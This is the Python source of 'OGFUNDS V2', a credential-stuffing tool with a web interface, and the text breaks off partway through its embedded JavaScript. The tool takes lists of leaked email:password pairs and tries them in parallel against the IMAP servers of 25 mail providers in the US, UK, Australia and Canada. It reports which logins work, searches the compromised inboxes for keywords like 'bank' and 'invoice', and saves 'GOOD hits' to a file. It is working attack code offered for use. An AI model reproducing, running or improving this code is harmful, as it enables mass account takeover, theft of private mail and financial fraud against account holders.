#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║                    OGFUNDS V2                           ║
║            USA · UK · AU · CA IMAP Checker              ║
╚══════════════════════════════════════════════════════════╝
"""

import http.server
import socketserver
import json
import urllib.parse
import imaplib
import socket
import threading
import sys
import os
import re
import time
import webbrowser
from datetime import datetime
from email.header import decode_header
from email import message_from_bytes
from concurrent.futures import ThreadPoolExecutor

PORT = 5371
TIMEOUT = 15
MAX_THREADS = 50

IMAP_SERVERS = {
    "Gmail": {"server":"imap.gmail.com","port":993,"ssl":True,"webmail":"https://mail.google.com","region":"🌐 Global","domain":r"@gmail\.com$|@googlemail\.com$"},
    "Outlook/Hotmail/Live": {"server":"outlook.office365.com","port":993,"ssl":True,"webmail":"https://outlook.live.com","region":"🌐 Global","domain":r"@outlook\.com$|@hotmail\.com$|@live\.com$|@live\.co\.uk$|@live\.com\.au$"},
    "Yahoo Mail": {"server":"imap.mail.yahoo.com","port":993,"ssl":True,"webmail":"https://mail.yahoo.com","region":"🌐 Global","domain":r"@yahoo\.com$|@yahoo\.co\.uk$|@yahoo\.com\.au$|@yahoo\.ca$|@ymail\.com$|@rocketmail\.com$"},
    "iCloud": {"server":"imap.mail.me.com","port":993,"ssl":True,"webmail":"https://www.icloud.com/mail","region":"🌐 Global","domain":r"@icloud\.com$|@me\.com$|@mac\.com$"},
    "AOL Mail": {"server":"imap.aol.com","port":993,"ssl":True,"webmail":"https://mail.aol.com","region":"🌐 Global","domain":r"@aol\.com$|@aim\.com$"},
    "Mail.com": {"server":"imap.mail.com","port":993,"ssl":True,"webmail":"https://www.mail.com/mail/","region":"🌐 Global","domain":r"@mail\.com$|@email\.com$|@usa\.com$|@consultant\.com$|@gmx\.us$"},
    "GMX": {"server":"imap.gmx.com","port":993,"ssl":True,"webmail":"https://www.gmx.com","region":"🌐 Global","domain":r"@gmx\.com$|@gmx\.us$"},
    "Zoho Mail": {"server":"imap.zoho.com","port":993,"ssl":True,"webmail":"https://mail.zoho.com","region":"🌐 Global","domain":r"@zoho\.com$"},
    "AT&T / Verizon": {"server":"imap.att.yahoo.com","port":993,"ssl":True,"webmail":"https://currently.att.yahoo.com","region":"🇺🇸 USA","domain":r"@att\.net$|@sbcglobal\.net$|@bellsouth\.net$|@pacbell\.net$|@ameritech\.net$|@verizon\.net$|@embarqmail\.com$"},
    "Comcast/Xfinity": {"server":"imap.comcast.net","port":993,"ssl":True,"webmail":"https://login.xfinity.com/login","region":"🇺🇸 USA","domain":r"@comcast\.net$"},
    "EarthLink": {"server":"imap.earthlink.net","port":993,"ssl":True,"webmail":"https://webmail.earthlink.net","region":"🇺🇸 USA","domain":r"@earthlink\.net$|@mindspring\.com$"},
    "BT Internet": {"server":"mail.btinternet.com","port":993,"ssl":True,"webmail":"https://www.bt.com/mail","region":"🇬🇧 UK","domain":r"@btinternet\.com$|@bt\.com$|@btopenworld\.com$"},
    "Sky Mail": {"server":"imap.tools.sky.com","port":993,"ssl":True,"webmail":"https://skyid.sky.com","region":"🇬🇧 UK","domain":r"@sky\.com$"},
    "TalkTalk": {"server":"mail.talktalk.net","port":993,"ssl":True,"webmail":"https://www.talktalk.co.uk/mail","region":"🇬🇧 UK","domain":r"@talktalk\.net$"},
    "Virgin Media UK": {"server":"imap.virginmedia.com","port":993,"ssl":True,"webmail":"https://www.virginmedia.com/my-virgin-media","region":"🇬🇧 UK","domain":r"@virginmedia\.com$|@ntlworld\.com$|@blueyonder\.co\.uk$"},
    "Telstra/BigPond": {"server":"imap.telstra.com","port":993,"ssl":True,"webmail":"https://webmail.telstra.com.au","region":"🇦🇺 AU","domain":r"@telstra\.com$|@bigpond\.com$|@bigpond\.com\.au$|@bigpond\.net\.au$"},
    "Optus AU": {"server":"mail.optusnet.com.au","port":993,"ssl":True,"webmail":"https://webmail.optusnet.com.au","region":"🇦🇺 AU","domain":r"@optusnet\.com\.au$"},
    "iiNet/Westnet": {"server":"mail.iinet.net.au","port":993,"ssl":True,"webmail":"https://webmail.iinet.net.au","region":"🇦🇺 AU","domain":r"@iinet\.net\.au$|@westnet\.com\.au$"},
    "Dodo AU": {"server":"mail.dodo.com.au","port":993,"ssl":True,"webmail":"https://webmail.dodo.com.au","region":"🇦🇺 AU","domain":r"@dodo\.com\.au$"},
    "Rogers": {"server":"imap.rogers.com","port":993,"ssl":True,"webmail":"https://webmail.rogers.com","region":"🇨🇦 CA","domain":r"@rogers\.com$"},
    "Bell/Sympatico": {"server":"imap.bell.net","port":993,"ssl":True,"webmail":"https://webmail.bell.net","region":"🇨🇦 CA","domain":r"@bell\.net$|@sympatico\.ca$"},
    "Shaw CA": {"server":"imap.shaw.ca","port":993,"ssl":True,"webmail":"https://webmail.shaw.ca","region":"🇨🇦 CA","domain":r"@shaw\.ca$"},
    "Telus CA": {"server":"imap.telus.net","port":993,"ssl":True,"webmail":"https://webmail.telus.net","region":"🇨🇦 CA","domain":r"@telus\.net$|@telus\.ca$"},
    "Cogeco CA": {"server":"mail.cogeco.net","port":993,"ssl":True,"webmail":"https://webmail.cogeco.net","region":"🇨🇦 CA","domain":r"@cogeco\.ca$|@cogeco\.net$"},
    "Eastlink CA": {"server":"mail.eastlink.ca","port":993,"ssl":True,"webmail":"https://webmail.eastlink.ca","region":"🇨🇦 CA","domain":r"@eastlink\.ca$"},
}

scan_state = {
    "running": False, "results": [], "total": 0,
    "completed": 0, "valid": 0, "current": None, "cancelled": False
}


def decode_mime_header(val):
    if not val: return ""
    parts = decode_header(val)
    res = []
    for p, cs in parts:
        if isinstance(p, bytes):
            try: res.append(p.decode(cs or "utf-8", errors="ignore"))
            except: res.append(p.decode("utf-8", errors="ignore"))
        else: res.append(p)
    return " ".join(res)


def get_provider(email):
    el = email.lower().strip()
    for name, cfg in IMAP_SERVERS.items():
        if re.search(cfg["domain"], el):
            return name, cfg
    return None, None


def search_inbox(mail, kw=None, limit=15):
    try:
        mail.select("INBOX")
        if kw:
            s, ids = mail.search(None, f'(SUBJECT "{kw}")')
            if s != "OK" or not ids[0]:
                s, ids = mail.search(None, f'(BODY "{kw}")')
        else:
            s, ids = mail.search(None, "ALL")
        if s != "OK": return []
        id_list = (ids[0].split() if ids[0] else [])[-limit:]
        res = []
        for num in id_list:
            try:
                s, d = mail.fetch(num, "(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])")
                if s != "OK" or not d: continue
                msg = message_from_bytes(d[0][1])
                res.append({
                    "subject": decode_mime_header(msg.get("Subject", ""))[:100],
                    "from": decode_mime_header(msg.get("From", ""))[:100],
                    "date": (msg.get("Date", "") or "")[:30]
                })
            except: continue
        return res
    except: return []


def check_one(email, password, search_flag, keyword):
    pname, pcfg = get_provider(email)
    if not pcfg:
        return {"email": email, "password": password, "status": "NO MATCH",
                "icon": "❌", "provider": "Unknown", "webmail": "N/A",
                "inbox": [], "error": "No provider match", "region": "?"}
    try:
        if pcfg["ssl"]:
            mail = imaplib.IMAP4_SSL(pcfg["server"], pcfg["port"], timeout=TIMEOUT)
        else:
            mail = imaplib.IMAP4(pcfg["server"], pcfg["port"]); mail.timeout = TIMEOUT
        lr = mail.login(email, password)
        valid = lr[0] == "OK"
        inbox = []
        if valid and (search_flag or keyword):
            inbox = search_inbox(mail, keyword if keyword else None)
        mail.logout()
        return {"email": email, "password": password,
                "status": "VALID" if valid else "FAILED",
                "icon": "✅" if valid else "❌",
                "provider": pname, "webmail": pcfg["webmail"],
                "inbox": inbox, "error": "" if valid else "Bad login",
                "region": pcfg["region"]}
    except Exception as e:
        err = str(e)[:80]
        if "timeout" in err.lower(): st, ic = "TIMEOUT", "⏱"
        else: st, ic = "FAILED", "❌"
        return {"email": email, "password": password, "status": st, "icon": ic,
                "provider": pname, "webmail": pcfg["webmail"], "inbox": [],
                "error": err, "region": pcfg.get("region","?")}


def parse_combos(text):
    combos = []
    for line in text.strip().split("\n"):
        line = line.strip()
        if ":" in line:
            e, p = line.split(":", 1)
            e, p = e.strip(), p.strip()
            if e and p and "@" in e:
                combos.append((e, p))
    return combos


# ===================== HTML =====================
def get_html():
    prov_json = json.dumps({k: {"region": v["region"], "webmail": v["webmail"]} for k, v in IMAP_SERVERS.items()})
    pc = len(IMAP_SERVERS)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OGFUNDS V2 — IMAP Checker</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap');
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{font-family:'Inter','Segoe UI',sans-serif;background:#070b14;color:#d1d5e8;min-height:100vh;overflow-x:hidden;}}
.container{{max-width:1500px;margin:0 auto;padding:18px;}}

/* HEADER */
.header{{text-align:center;padding:28px 0 18px;border-bottom:1px solid rgba(58,123,213,0.15);margin-bottom:22px;position:relative;}}
.header::after{{content:'';position:absolute;bottom:-1px;left:25%;width:50%;height:1px;background:linear-gradient(90deg,transparent,#3a7bd5,#00d2ff,transparent);}}
.header h1{{font-size:3.2em;font-weight:900;letter-spacing:4px;background:linear-gradient(135deg,#00d2ff,#3a7bd5,#a855f7,#00d2ff);background-size:300% 300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:grad 4s ease infinite;}}
@keyframes grad{{0%{{background-position:0% 50%}}50%{{background-position:100% 50%}}100%{{background-position:0% 50%}}}}
.header h1 span{{font-size:0.45em;vertical-align:super;background:linear-gradient(135deg,#a855f7,#00d2ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}}
.header .subtitle{{color:#5a7a9a;font-size:0.8em;margin-top:6px;letter-spacing:3px;font-weight:500;}}
.badge-row{{margin-top:10px;display:flex;justify-content:center;gap:6px;flex-wrap:wrap;}}
.badge-row span{{display:inline-block;padding:3px 12px;border-radius:20px;font-size:0.65em;font-weight:700;letter-spacing:0.8px;backdrop-filter:blur(4px);}}
.bg-global{{background:rgba(58,123,213,0.12);color:#5ab0ff;border:1px solid rgba(58,123,213,0.25);}}
.bg-usa{{background:rgba(90,255,90,0.08);color:#5aff5a;border:1px solid rgba(90,255,90,0.2);}}
.bg-uk{{background:rgba(90,90,255,0.08);color:#5a5aff;border:1px solid rgba(90,90,255,0.2);}}
.bg-au{{background:rgba(255,90,90,0.08);color:#ff5a5a;border:1px solid rgba(255,90,90,0.2);}}
.bg-ca{{background:rgba(255,170,90,0.08);color:#ffaa5a;border:1px solid rgba(255,170,90,0.2);}}

/* MAIN GRID */
.main-grid{{display:grid;grid-template-columns:380px 1fr;gap:18px;}}
@media(max-width:1100px){{.main-grid{{grid-template-columns:1fr;}}}}

/* PANELS */
.panel{{background:linear-gradient(145deg,#0f1629,#0b1120);border:1px solid rgba(58,123,213,0.1);border-radius:14px;padding:18px;margin-bottom:16px;transition:border-color 0.3s;}}
.panel:hover{{border-color:rgba(58,123,213,0.2);}}
.panel-title{{font-size:0.7em;font-weight:800;text-transform:uppercase;letter-spacing:2px;color:#4a6a8a;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid rgba(58,123,213,0.08);display:flex;align-items:center;gap:8px;}}
.panel-title .dot{{width:6px;height:6px;border-radius:50%;display:inline-block;}}
.dot-blue{{background:#3a7bd5;box-shadow:0 0 8px rgba(58,123,213,0.5);}}
.dot-green{{background:#5aff7a;box-shadow:0 0 8px rgba(90,255,122,0.5);}}
.dot-red{{background:#ff5a5a;box-shadow:0 0 8px rgba(255,90,90,0.5);}}
.dot-purple{{background:#a855f7;box-shadow:0 0 8px rgba(168,85,247,0.5);}}

/* FORM */
.form-group{{margin-bottom:10px;}}
.form-group label{{display:block;font-size:0.65em;color:#4a6a8a;margin-bottom:4px;text-transform:uppercase;letter-spacing:1.5px;font-weight:600;}}
textarea,input[type="text"],select{{width:100%;background:rgba(7,11,20,0.8);border:1px solid rgba(58,123,213,0.12);border-radius:8px;color:#d1d5e8;padding:10px 12px;font-size:0.82em;font-family:'JetBrains Mono','Consolas','Courier New',monospace;transition:all 0.3s;outline:none;}}
textarea:focus,input:focus{{border-color:#3a7bd5;box-shadow:0 0 20px rgba(58,123,213,0.08);}}
textarea#comboInput{{min-height:220px;resize:vertical;line-height:1.5;}}
textarea#comboInput::placeholder{{color:#2a3a5a;}}

/* OPTIONS */
.options-row{{display:flex;gap:10px;flex-wrap:wrap;align-items:center;}}
.option-item{{display:flex;align-items:center;gap:5px;}}
.option-item label{{font-size:0.62em;color:#4a6a8a;text-transform:uppercase;letter-spacing:1px;cursor:pointer;font-weight:600;}}
.option-item input[type="checkbox"]{{width:16px;height:16px;accent-color:#3a7bd5;cursor:pointer;border-radius:3px;}}
.option-item input[type="text"]{{width:70px;padding:5px 7px;font-size:0.75em;min-height:unset;text-align:center;}}

/* BUTTONS */
.btn{{padding:10px 22px;border:none;border-radius:8px;font-size:0.75em;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;cursor:pointer;transition:all 0.3s;position:relative;overflow:hidden;}}
.btn::after{{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.05),transparent);transition:left 0.5s;}}
.btn:hover::after{{left:100%;}}
.btn-primary{{background:linear-gradient(135deg,#3a7bd5,#00d2ff);color:#fff;box-shadow:0 4px 15px rgba(58,123,213,0.25);}}
.btn-primary:hover{{transform:translateY(-2px);box-shadow:0 8px 25px rgba(58,123,213,0.35);}}
.btn-primary:disabled{{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}}
.btn-danger{{background:linear-gradient(135deg,#d53a3a,#ff5a5a);color:#fff;box-shadow:0 4px 15px rgba(213,58,58,0.2);}}
.btn-danger:hover{{transform:translateY(-2px);box-shadow:0 8px 25px rgba(213,58,58,0.3);}}
.btn-danger:disabled{{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}}
.btn-success{{background:linear-gradient(135deg,#2d9a4a,#5aff7a);color:#070b14;box-shadow:0 4px 15px rgba(45,154,74,0.2);}}
.btn-success:hover{{transform:translateY(-2px);box-shadow:0 8px 25px rgba(45,154,74,0.3);}}
.btn-success:disabled{{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}}
.btn-purple{{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;box-shadow:0 4px 15px rgba(124,58,237,0.2);}}
.btn-purple:hover{{transform:translateY(-2px);box-shadow:0 8px 25px rgba(124,58,237,0.3);}}
.btn-purple:disabled{{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none;}}
.btn-gray{{background:rgba(30,41,59,0.6);color:#8a9ab0;border:1px solid rgba(58,123,213,0.1);}}
.btn-gray:hover{{background:rgba(30,41,59,0.9);color:#d1d5e8;}}
.actions{{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;}}

/* STATS */
.stats-grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:10px;}}
.stat-box{{background:rgba(7,11,20,0.6);border:1px solid rgba(58,123,213,0.08);border-radius:10px;padding:12px 8px;text-align:center;position:relative;overflow:hidden;}}
.stat-box::before{{content:'';position:absolute;top:0;left:0;right:0;height:2px;}}
.stat-box:nth-child(1)::before{{background:linear-gradient(90deg,#3a7bd5,#00d2ff);}}
.stat-box:nth-child(2)::before{{background:linear-gradient(90deg,#2d9a4a,#5aff7a);}}
.stat-box:nth-child(3)::before{{background:linear-gradient(90deg,#d53a3a,#ff5a5a);}}
.stat-box:nth-child(4)::before{{background:linear-gradient(90deg,#7c3aed,#a855f7);}}
.stat-box .num{{font-size:1.8em;font-weight:900;color:#00d2ff;display:block;line-height:1.2;font-family:'JetBrains Mono',monospace;}}
.stat-box .num.green{{color:#5aff7a;}}
.stat-box .num.red{{color:#ff5a5a;}}
.stat-box .num.purple{{color:#a855f7;}}
.stat-box .label{{font-size:0.55em;text-transform:uppercase;letter-spacing:1.5px;color:#4a6a8a;font-weight:600;margin-top:2px;display:block;}}

/* PROGRESS */
.progress-wrap{{margin:8px 0;}}
.progress-bar{{width:100%;height:4px;background:rgba(58,123,213,0.1);border-radius:2px;overflow:hidden;}}
.progress-fill{{height:100%;background:linear-gradient(90deg,#3a7bd5,#00d2ff,#a855f7);border-radius:2px;width:0%;transition:width 0.4s ease;background-size:200% 100%;animation:barMove 2s linear infinite;}}
@keyframes barMove{{0%{{background-position:200% 0}}100%{{background-position:-200% 0}}}}

/* CURRENT */
.current-info{{display:none;align-items:center;gap:10px;padding:8px 14px;background:rgba(7,11,20,0.6);border:1px solid rgba(58,123,213,0.1);border-radius:8px;margin:8px 0;font-size:0.78em;}}
.current-info .cur-email{{color:#00d2ff;font-weight:600;}}
.spinner{{width:14px;height:14px;border:2px solid rgba(58,123,213,0.2);border-top-color:#00d2ff;border-radius:50%;animation:spin 0.7s linear infinite;display:inline-block;flex-shrink:0;}}
@keyframes spin{{to{{transform:rotate(360deg);}}}}

/* LOG */
.status-log{{background:rgba(7,11,20,0.6);border:1px solid rgba(58,123,213,0.06);border-radius:8px;padding:8px;max-height:220px;overflow-y:auto;font-family:'JetBrains Mono','Consolas',monospace;font-size:0.7em;line-height:1.6;}}
.status-log .log-entry{{padding:2px 4px;border-bottom:1px solid rgba(58,123,213,0.03);}}
.status-log .log-valid{{color:#5aff7a;}}
.status-log .log-fail{{color:#ff5a5a;}}
.status-log .log-info{{color:#4a6a8a;}}
.status-log .log-highlight{{color:#00d2ff;font-weight:600;}}

/* RESULTS */
.results-wrap{{max-height:500px;overflow-y:auto;border-radius:8px;}}
.results-table{{width:100%;border-collapse:separate;border-spacing:0;font-size:0.72em;}}
.results-table th{{text-align:left;padding:8px 10px;color:#4a6a8a;text-transform:uppercase;letter-spacing:1.5px;font-size:0.6em;font-weight:700;border-bottom:1px solid rgba(58,123,213,0.08);position:sticky;top:0;background:#0b1120;z-index:2;}}
.results-table td{{padding:6px 10px;border-bottom:1px solid rgba(58,123,213,0.04);vertical-align:middle;word-break:break-all;}}
.results-table tr{{transition:background 0.15s;}}
.results-table tr:hover td{{background:rgba(58,123,213,0.04);}}
.valid-row td{{border-left:3px solid #5aff7a;background:rgba(90,255,122,0.02);}}
.fail-row td{{border-left:3px solid #ff5a5a;}}
.email-cell{{color:#00d2ff;font-weight:600;font-family:'JetBrains Mono',monospace;font-size:0.9em;}}
.pass-cell{{color:#5a7a9a;font-family:'JetBrains Mono',monospace;font-size:0.9em;}}
.prov-cell{{color:#8a9ab0;font-size:0.85em;}}
.wl-link{{color:#3a5a7a;text-decoration:none;font-size:0.8em;transition:color 0.3s;}}
.wl-link:hover{{color:#00d2ff;text-decoration:underline;}}
.toggle-inbox{{color:#3a7bd5;cursor:pointer;font-size:0.65em;text-transform:uppercase;letter-spacing:1px;font-weight:600;transition:color 0.3s;white-space:nowrap;}}
.toggle-inbox:hover{{color:#00d2ff;}}
.inbox-row{{display:none;}}
.inbox-box{{background:rgba(7,11,20,0.8);border-radius:6px;padding:10px;margin:4px 0;border:1px solid rgba(58,123,213,0.06);}}
.inbox-item{{padding:5px 0;border-bottom:1px solid rgba(58,123,213,0.04);font-size:0.9em;}}
.inbox-item:last-child{{border-bottom:none;}}
.inbox-item .i-subj{{color:#d1d5e8;font-weight:500;}}
.inbox-item .i-from{{color:#5a7a9a;font-size:0.85em;}}
.inbox-item .i-date{{color:#3a5a7a;font-size:0.8em;}}

/* EMPTY */
.empty-state{{text-align:center;padding:40px 20px;color:#2a3a5a;}}
.empty-state .icon{{font-size:3em;margin-bottom:10px;opacity:0.5;}}
.empty-state p{{font-size:0.85em;color:#3a5a7a;}}

/* SCROLLBAR */
::-webkit-scrollbar{{width:3px;}}
::-webkit-scrollbar-track{{background:transparent;}}
::-webkit-scrollbar-thumb{{background:rgba(58,123,213,0.2);border-radius:2px;}}
::-webkit-scrollbar-thumb:hover{{background:rgba(58,123,213,0.3);}}

/* PROVIDER GRID */
.prov-grid{{display:grid;grid-template-columns:repeat(2,1fr);gap:3px;font-size:0.62em;max-height:180px;overflow-y:auto;}}
.prov-item{{background:rgba(7,11,20,0.4);padding:4px 7px;border-radius:4px;border:1px solid rgba(58,123,213,0.04);transition:all 0.3s;}}
.prov-item:hover{{background:rgba(58,123,213,0.06);border-color:rgba(58,123,213,0.12);}}
.prov-name{{color:#00d2ff;font-weight:500;}}
.prov-region{{color:#3a5a7a;float:right;font-size:0.9em;}}

/* SAVE STATUS */
.save-info{{font-size:0.65em;color:#3a5a7a;margin-top:6px;padding:6px 10px;background:rgba(7,11,20,0.4);border-radius:6px;border:1px solid rgba(58,123,213,0.06);}}
.save-info .saved{{color:#5aff7a;font-weight:600;}}
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>OGFUNDS <span>V2</span></h1>
        <div class="subtitle">✦ USA · UK · AU · CA  |  IMAP CHECKER  |  INBOX SCANNER ✦</div>
        <div class="badge-row">
            <span class="bg-global">🌐 Global</span>
            <span class="bg-usa">🇺🇸 USA</span>
            <span class="bg-uk">🇬🇧 UK</span>
            <span class="bg-au">🇦🇺 AU</span>
            <span class="bg-ca">🇨🇦 CA</span>
            <span class="bg-global">{pc} Providers</span>
        </div>
    </div>

    <div class="main-grid">
        <!-- LEFT -->
        <div>
            <div class="panel">
                <div class="panel-title"><span class="dot dot-blue"></span> Input</div>
                <div class="form-group">
                    <label>Email:Password Combos</label>
                    <textarea id="comboInput" placeholder="email@domain.com:password&#10;user@gmail.com:mypass123&#10;someone@btinternet.com:pass456"></textarea>
                </div>
                <div class="form-group">
                    <div class="options-row">
                        <div class="option-item">
                            <input type="checkbox" id="searchToggle">
                            <label for="searchToggle">🔍 Inbox</label>
                        </div>
                        <div class="option-item">
                            <label>Keyword</label>
                            <input type="text" id="keywordInput" placeholder="bank,invoice...">
                        </div>
                        <div class="option-item">
                            <label>Threads</label>
                            <input type="text" id="threadsInput" value="50">
                        </div>
                    </div>
                </div>
                <div class="actions">
                    <button class="btn btn-primary" id="startBtn" onclick="startScan()">▶ Start</button>
                    <button class="btn btn-danger" id="stopBtn" onclick="stopScan()" disabled>⏹ Stop</button>
                    <button class="btn btn-success" id="saveGoodBtn" onclick="saveGood()" disabled>💾 Save GOOD</button>
                    <button class="btn btn-danger" id="saveBadBtn" onclick="saveBad()" disabled>💾 Save BAD</button>
                    <button class="btn btn-gray" onclick="clearAll()">🗑 Clear</button>
                </div>
                <div class="save-info" id="saveInfo">💾 <span class="saved">GOOD</span> hits go to <code style="color:#5aff7a;">OGFUNDS_GOOD.txt</code> &nbsp;|&nbsp; <span class="saved" style="color:#ff5a5a;">BAD</span> hits go to <code style="color:#ff5a5a;">OGFUNDS_BAD.txt</code></div>
            </div>

            <div class="panel">
                <div class="panel-title"><span class="dot dot-purple"></span> IMAP Servers ({pc})</div>
                <div class="prov-grid" id="provGrid"></div>
            </div>
        </div>

        <!-- RIGHT -->
        <div>
            <div class="panel">
                <div class="panel-title"><span class="dot dot-green"></span> Statistics</div>
                <div class="stats-grid">
                    <div class="stat-box"><span class="num" id="totalNum">0</span><span class="label">Total Checked</span></div>
                    <div class="stat-box"><span class="num green" id="validNum">0</span><span class="label">✅ Valid</span></div>
                    <div class="stat-box"><span class="num red" id="failNum">0</span><span class="label">❌ Failed</span></div>
                    <div class="stat-box"><span class="num purple" id="pctNum">0%</span><span class="label">Progress</span></div>
                </div>
                <div class="progress-wrap">
                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
                </div>
                <div class="current-info" id="currentInfo">
                    <span class="spinner"></span>
                    <span>Checking: </span>
                    <span class="cur-email" id="curEmail">—</span>
                </div>
            </div>

            <div class="panel">
                <div class="panel-title"><span class="dot dot-blue"></span> Live Log</div>
                <div class="status-log" id="statusLog">
                    <div class="log-entry log-info">● System ready. Paste combos and start scan.</div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-title"><span class="dot dot-green"></span> Results</div>
                <div class="results-wrap" id="resultsContainer">
                    <div class="empty-state"><div class="icon">📭</div><p>No results yet. Start a scan to begin.</p></div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
const providers = {prov_json};

(function(){{
    const g=document.getElementById('provGrid');
    for(const[n,c]of Object.entries(providers)){{
        const d=document.createElement('div');d.className='prov-item';
        d.innerHTML='<span class="prov-name">'+n+'</span><span class="prov-region">'+c.region+'</span>';
        g.appendChild(d);
    }}
}})();

let pollTimer=null;

function log(m,c='log-info'){{const l=document.getElementById('statusLog');const e=document.createElement('div');e.className='log-entry '+c;e.textContent=m;l.appendChild(e);l.scrollTop=l.scrollHeight;}}
function esc(s){{if(!s)return'';return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}}

function startScan(){{
    const ct=document.getElementById('comboInput').value.trim();
    if(!ct){{log('⚠ No combos to check','log-fail');return;}}
    const si=document.getElementById('searchToggle').checked;
    const kw=document.getElementById('keywordInput').value.trim();
    const th=parseInt(document.getElementById('threadsInput').value)||50;

    document.getElementById('startBtn').disabled=true;
    document.getElementById('stopBtn').disabled=false;
    document.getElementById('saveGoodBtn').disabled=true;
    document.getElementById('saveBadBtn').disabled=true;
    document.getElementById('resultsContainer').innerHTML='<div class="empty-state"><div class="icon">⏳</div><p>Scanning...</p></div>';
    document.getElementById('totalNum').textContent='0';
    document.getElementById('validNum').textContent='0';
    document.getElementById('failNum').textContent='0';
    document.getElementById('progressFill').style.width='0%';
    document.getElementById('pctNum').textContent='0%';
    document.getElementById('statusLog').innerHTML='';
    log('▶ Starting scan with '+th+' threads...','log-highlight');
    if(si)log('🔍 Inbox search ON'+(kw?' | Keyword: "'+kw+'"':''),'log-info');

    fetch('/api/start',{{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{combos:ct,search:si,keyword:kw,threads:th}})
    }}).then(r=>r.json()).then(d=>{{
        if(d.error){{log('⚠ '+d.error,'log-fail');document.getElementById('startBtn').disabled=false;document.getElementById('stopBtn').disabled=true;return;}}
        log('✓ '+d.total+' combos loaded','log-valid');
        if(pollTimer)clearInterval(pollTimer);
        pollTimer=setInterval(pollState,350);
    }}).catch(e=>{{log('⚠ Error: '+e,'log-fail');document.getElementById('startBtn').disabled=false;document.getElementById('stopBtn').disabled=true;}});
}}

function stopScan(){{
    fetch('/api/stop',{{method:'POST'}}).then(()=>{{
        log('⏹ Scan stopped by user','log-fail');
        document.getElementById('stopBtn').disabled=true;
    }});
}}

function pollState(){{
    fetch('/api/state').then(r=>r.json()).then(d=>{{
        document.getElementById('totalNum').textContent=d.total;
        document.getElementById('validNum').textContent=d.valid;
        const fail=d.total-d.valid;
        document.getElementById('failNum').textContent=fail;
        const pct=d.total>0?Math.round(d.completed/d.total*100):0;
        document.getElementById('pctNum').textContent=pct+'%';
        document.getElementById('progressFill').style.width=pct+'%';

        document.getElementById('startBtn').disabled=d.running;
        document.getElementById('stopBtn').disabled=!d.running;
        const hasRes=d.results&&d.results.length>0;
        document.getElementById('saveGoodBtn').disabled=d.running||!hasRes;
        document.getElementById('saveBadBtn').disabled=d.running||!hasRes;

        if(d.running){{
            document.getElementById('currentInfo').style.display='flex';
            document.getElementById('curEmail').textContent=d.current||'—';
        }}else{{
            document.getElementById('currentInfo').style.display='none';
            if(pct===100&&d.completed>0){{
                clearInterval(pollTimer);pollTimer=null;
                log('✓ SCAN COMPLETE — '+d.valid+' valid, '+fail+' failed','log-valid');
                document.getElementById('saveGoodBtn').disabled=false;
                document.getElementById('saveBadBtn').disabled=false;
            }}
        }}
        if(d.results&&d.results.length>0)renderResults(d.results);
    }});
}}

function renderResults(results){{
    const c=document.getElementById('resultsContainer');
    let h='<table class="results-table"><tr><th>#</th><th>Status</th><th>Email</th><th>Password</th><th>Provider</th><th>Inbox</th></tr>';
    results.forEach((r,i)=>{{
        const rc=r.status==='VALID'?'valid-row':'fail-row';
        const ic=r.status==='VALID'?'✅':(r.status==='TIMEOUT'?'⏱':'❌');
        let ib='—';
        if(r.inbox&&r.inbox.length>0)ib='<span class="toggle-inbox" onclick="togInbox('+i+')">📬 '+r.inbox.length+'</span>';
        else if(r.status==='VALID')ib='<span style="color:#3a5a7a;font-size:0.8em;">empty</span>';
        h+='<tr class="'+rc+'"><td>'+(i+1)+'</td><td>'+ic+'</td><td class="email-cell">'+esc(r.email)+'</td><td class="pass-cell">'+esc(r.password)+'</td><td class="prov-cell">'+esc(r.provider)+'</td><td>'+ib+'</td></tr>';
        if(r.inbox&&r.inbox.length>0){{
            h+='<tr id="ibR'+i+'" class="inbox-row"><td colspan="6"><div class="inbox-box">';
            r.inbox.forEach(em=>{{
                h+='<div class="inbox-item"><div class="i-subj">📧 '+esc(em.subject)+'</div><div class="i-from">From: '+esc(em.from)+'</div><div class="i-date">'+esc(em.date)+'</div></div>';
            }});
            h+='</div></td></tr>';
        }}
    }});
    h+='</table>';
    c.innerHTML=h;
}}

function togInbox(i){{const r=document.getElementById('ibR'+i);if(r)r.style.display=r.style.display==='none'?'table-row':'none';}}

function saveGood(){{
    window.open('/api/save/good','_blank');
    log('💾 GOOD hits saved to OGFUNDS_GOOD.txt','log-valid');
}}

function saveBad(){{
    window.open('/api/save/bad','_blank');
    log('💾 BAD hits saved to OGFUNDS_BAD.txt','log-fail');
}}

function clearAll(){{
    if(pollTimer){{clearInterval(pollTimer);pollTimer=null;}}
    fetch('/api/stop',{{method:'POST'}});
    document.getElementById('comboInput').value='';
    document.getElementById('resultsContainer').innerHTML='<div class="empty-state"><div class="icon">📭</div><p>No results yet. Start a scan to begin.</p></div>';
    document.getElementById('totalNum').textContent='0';
    document.getElementById('validNum').textContent='0';
    document.getElementById('failNum').textContent='0';
    document.getElementById('progressFill').style.width='0%';
